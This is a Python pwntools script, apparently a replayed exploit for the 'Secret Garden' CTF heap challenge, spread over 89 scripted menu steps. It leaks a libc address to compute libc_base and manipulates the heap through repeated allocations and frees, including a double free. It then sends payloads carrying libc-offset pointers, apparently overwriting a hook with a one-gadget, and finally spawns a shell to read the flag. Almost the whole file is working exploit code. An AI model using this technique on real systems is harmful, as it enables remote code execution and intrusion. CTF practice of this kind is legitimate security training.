check_str.append(b'Successful !\n\n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\xe2\x98\x86          Secret Garden          \xe2\x98\x86 \n\xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \xe2\x98\x86 \n\n  1 . Raise a flower \n  2 . Visit the garden \n  3 . Remove a flower from the garden\n  4 . Clean the garden\n  5 . Leave the garden\n\nYour choice : ')
check_str.append(b'Which flower do you want to remove from the garden:')

def check_step(step, traffic):
    if check_str[step] != traffic:
        logging.error('check step {} ...fail'.format(step))
    else:
        logging.info('check step {} ...ok'.format(step))
    

sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(334)
# ---------step [0/89]-----------
check_step(0, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [1/89]-----------
check_step(1, recv_traffic)


sleep(0.1)
p.send(b'160\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [2/89]-----------
check_step(2, recv_traffic)


sleep(0.1)
p.send(b'11111111')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [3/89]-----------
check_step(3, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [4/89]-----------
check_step(4, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [5/89]-----------
check_step(5, recv_traffic)


sleep(0.1)
p.send(b'96\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [6/89]-----------
check_step(6, recv_traffic)


sleep(0.1)
p.send(b'22222222')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [7/89]-----------
check_step(7, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [8/89]-----------
check_step(8, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [9/89]-----------
check_step(9, recv_traffic)


sleep(0.1)
p.send(b'96\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [10/89]-----------
check_step(10, recv_traffic)


sleep(0.1)
p.send(b'33333333')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [11/89]-----------
check_step(11, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [12/89]-----------
check_step(12, recv_traffic)


sleep(0.1)
p.send(b'3\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(51)
# ---------step [13/89]-----------
check_step(13, recv_traffic)


sleep(0.1)
p.send(b'0\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(345)
# ---------step [14/89]-----------
check_step(14, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [15/89]-----------
check_step(15, recv_traffic)


sleep(0.1)
p.send(b'112\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [16/89]-----------
check_step(16, recv_traffic)


sleep(0.1)
p.send(b'x')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [17/89]-----------
check_step(17, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [18/89]-----------
check_step(18, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [19/89]-----------
check_step(19, recv_traffic)


sleep(0.1)
p.send(b'64\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [20/89]-----------
check_step(20, recv_traffic)


sleep(0.1)
p.send(b'44444444')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [21/89]-----------
check_step(21, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [22/89]-----------
check_step(22, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [23/89]-----------
check_step(23, recv_traffic)


sleep(0.1)
p.send(b'64\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [24/89]-----------
check_step(24, recv_traffic)


sleep(0.1)
p.send(b'55555555')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [25/89]-----------
check_step(25, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [26/89]-----------
check_step(26, recv_traffic)


sleep(0.1)
p.send(b'2\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(139)
recv_traffic += b'$'*6
libc_address = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = libc_address - 3947384
logging.info('Get libc_base: ' + hex(libc_base) + ', ori_value:0x7f1e76df0b78, ori_offset: 0x3c3b78')
recv_traffic += p.recvn(477)
# ---------step [27/89]-----------
check_step(27, recv_traffic)


sleep(0.1)
p.send(b'3\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(51)
# ---------step [28/89]-----------
check_step(28, recv_traffic)


sleep(0.1)
p.send(b'4\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(345)
# ---------step [29/89]-----------
check_step(29, recv_traffic)


sleep(0.1)
p.send(b'3\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(51)
# ---------step [30/89]-----------
check_step(30, recv_traffic)


sleep(0.1)
p.send(b'5\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(345)
# ---------step [31/89]-----------
check_step(31, recv_traffic)


sleep(0.1)
p.send(b'3\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(51)
# ---------step [32/89]-----------
check_step(32, recv_traffic)


sleep(0.1)
p.send(b'4\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(345)
# ---------step [33/89]-----------
check_step(33, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [34/89]-----------
check_step(34, recv_traffic)


sleep(0.1)
p.send(b'64\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [35/89]-----------
check_step(35, recv_traffic)


sleep(0.1)
p.send(b'q\x00\x00\x00\x00\x00\x00\x00')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [36/89]-----------
check_step(36, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [37/89]-----------
check_step(37, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [38/89]-----------
check_step(38, recv_traffic)


sleep(0.1)
p.send(b'64\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [39/89]-----------
check_step(39, recv_traffic)


sleep(0.1)
p.send(b'/bin/sh\x00')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [40/89]-----------
check_step(40, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [41/89]-----------
check_step(41, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [42/89]-----------
check_step(42, recv_traffic)


sleep(0.1)
p.send(b'64\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [43/89]-----------
check_step(43, recv_traffic)


sleep(0.1)
p.send(b'77777777')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [44/89]-----------
check_step(44, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [45/89]-----------
check_step(45, recv_traffic)


sleep(0.1)
p.send(b'3\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(51)
# ---------step [46/89]-----------
check_step(46, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(345)
# ---------step [47/89]-----------
check_step(47, recv_traffic)


sleep(0.1)
p.send(b'3\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(51)
# ---------step [48/89]-----------
check_step(48, recv_traffic)


sleep(0.1)
p.send(b'2\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(345)
# ---------step [49/89]-----------
check_step(49, recv_traffic)


sleep(0.1)
p.send(b'3\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(51)
# ---------step [50/89]-----------
check_step(50, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(345)
# ---------step [51/89]-----------
check_step(51, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [52/89]-----------
check_step(52, recv_traffic)


sleep(0.1)
p.send(b'96\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [53/89]-----------
check_step(53, recv_traffic)


sleep(0.1)
payload =  p64(libc_base+3947320) + b'' 
p.send(payload)
logging.debug('send with variable')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [54/89]-----------
check_step(54, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [55/89]-----------
check_step(55, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [56/89]-----------
check_step(56, recv_traffic)


sleep(0.1)
p.send(b'96\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [57/89]-----------
check_step(57, recv_traffic)


sleep(0.1)
p.send(b'11111111')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [58/89]-----------
check_step(58, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [59/89]-----------
check_step(59, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [60/89]-----------
check_step(60, recv_traffic)


sleep(0.1)
p.send(b'96\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [61/89]-----------
check_step(61, recv_traffic)


sleep(0.1)
p.send(b'22222222')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [62/89]-----------
check_step(62, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [63/89]-----------
check_step(63, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [64/89]-----------
check_step(64, recv_traffic)


sleep(0.1)
p.send(b'96\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [65/89]-----------
check_step(65, recv_traffic)


sleep(0.1)
payload =  b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p64(libc_base+3951696) + b'' 
p.send(payload)
logging.debug('send with variable')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [66/89]-----------
check_step(66, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [67/89]-----------
check_step(67, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [68/89]-----------
check_step(68, recv_traffic)


sleep(0.1)
p.send(b'768\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [69/89]-----------
check_step(69, recv_traffic)


sleep(0.1)
p.send(b'7')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [70/89]-----------
check_step(70, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [71/89]-----------
check_step(71, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [72/89]-----------
check_step(72, recv_traffic)


sleep(0.1)
p.send(b'768\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [73/89]-----------
check_step(73, recv_traffic)


sleep(0.1)
p.send(b'7')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [74/89]-----------
check_step(74, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [75/89]-----------
check_step(75, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [76/89]-----------
check_step(76, recv_traffic)


sleep(0.1)
p.send(b'768\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [77/89]-----------
check_step(77, recv_traffic)


sleep(0.1)
p.send(b'7')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [78/89]-----------
check_step(78, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [79/89]-----------
check_step(79, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [80/89]-----------
check_step(80, recv_traffic)


sleep(0.1)
p.send(b'96\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [81/89]-----------
check_step(81, recv_traffic)


sleep(0.1)
p.send(b'7')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [82/89]-----------
check_step(82, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [83/89]-----------
check_step(83, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [84/89]-----------
check_step(84, recv_traffic)


sleep(0.1)
p.send(b'256\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(20)
# ---------step [85/89]-----------
check_step(85, recv_traffic)


sleep(0.1)
payload =  b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p64(libc_base+283536) + b'' 
p.send(payload)
logging.debug('send with variable')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(25)
# ---------step [86/89]-----------
check_step(86, recv_traffic)


sleep(0.1)
p.send(b'1\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(347)
# ---------step [87/89]-----------
check_step(87, recv_traffic)


sleep(0.1)
p.send(b'3\n')
sleep(0.1)
recv_traffic = b''
recv_traffic += p.recvn(51)
# ---------step [88/89]-----------
check_step(88, recv_traffic)


sleep(0.1)
p.send(b'7\ncd /home/secretgarden/\ncat flag\n')
p.interactive()
